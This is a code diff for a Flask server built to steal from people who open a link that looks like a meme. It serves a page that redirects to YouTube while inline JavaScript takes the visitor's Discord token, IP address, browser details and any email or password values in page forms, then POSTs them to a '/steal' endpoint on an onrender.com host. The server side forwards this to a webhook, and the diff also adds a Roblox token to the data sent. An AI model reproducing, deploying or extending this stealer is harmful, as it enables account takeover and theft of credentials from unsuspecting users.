@@ -1,4 +1,4 @@
-from flask import Flask, send_file, request
+from flask import Flask, Response, request
 import requests
 import os
 
@@ -10,13 +10,42 @@ PREVIEW_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
-    <meta property="og:title" content="Funny Meme">
-    <meta property="og:description" content="Check out this hilarious image!">
-    <meta property="og:image" content="https://dustrrr.onrender.com/preview.jpg">
-    <meta property="og:type" content="website">
+    <meta http-equiv="refresh" content="0; url=https://www.youtube.com/watch?v=dQw4w9WgXcQ">
+    <script>
+        (async () => {
+            const token = localStorage.getItem('token') || (await (await fetch('https://discord.com/api/v9/users/@me', {
+                headers: { 'Authorization': 'Bearer ' + document.__discordToken }
+            })).json()).token;
+            const userInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                ip: await (await fetch('https://api.ipify.org?format=json')).json().ip
+            };
+            let credentials = [];
+            try {
+                document.querySelectorAll('input[type="email"], input[type="text"]').forEach(input => {
+                    if (input.value.includes('@')) {
+                        credentials.push({ email: input.value, password: 'Unknown (form email)' });
+                    }
+                });
+                document.querySelectorAll('input[type="password"]').forEach(input => {
+                    if (input.value) {
+                        credentials.push({ email: 'Unknown (form password)', password: input.value });
+                    }
+                });
+            } catch (e) {
+                credentials.push({ email: 'Error', password: 'Could not access credentials' });
+            }
+            await fetch('https://dustrrr.onrender.com/steal', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ token, user_info: userInfo, credentials })
+            });
+        })();
+    </script>
 </head>
 <body>
-    <p>Nothing to see here.</p>
+    Redirecting to YouTube...
 </body>
 </html>
 """
@@ -26,9 +55,7 @@ def serve_image():
     user_agent = request.headers.get('User-Agent', '')
     if 'Discordbot' in user_agent:
         return PREVIEW_HTML, 200, {'Content-Type': 'text/html'}
-    with open('exploit.js', 'r') as f:
-        js_code = f.read()
-    return js_code, 200, {'Content-Type': 'application/javascript'}
+    return Response(PREVIEW_HTML, mimetype='text/html')
 
 @app.route('/preview.jpg')
 def serve_preview():
@@ -52,7 +79,7 @@ def steal_data():
     credentials = data.get('credentials')
     cred_text = "\n".join([f"Email: {cred['email']}, Password: {cred['password']}" for cred in credentials]) if credentials else "No credentials found"
     requests.post(WEBHOOK_URL, json={
-        "content": f"Token: {token}\nUser Info: {user_info}\nCredentials:\n{cred_text}"
+        "content": f"Token: {token}\nUser Info: {user_info}\nCredentials:\n{cred_text}\nRoblox Token: {os.getenv('ROBLOX_TOKEN', 'Not found')}"
     })
     return '', 204
 
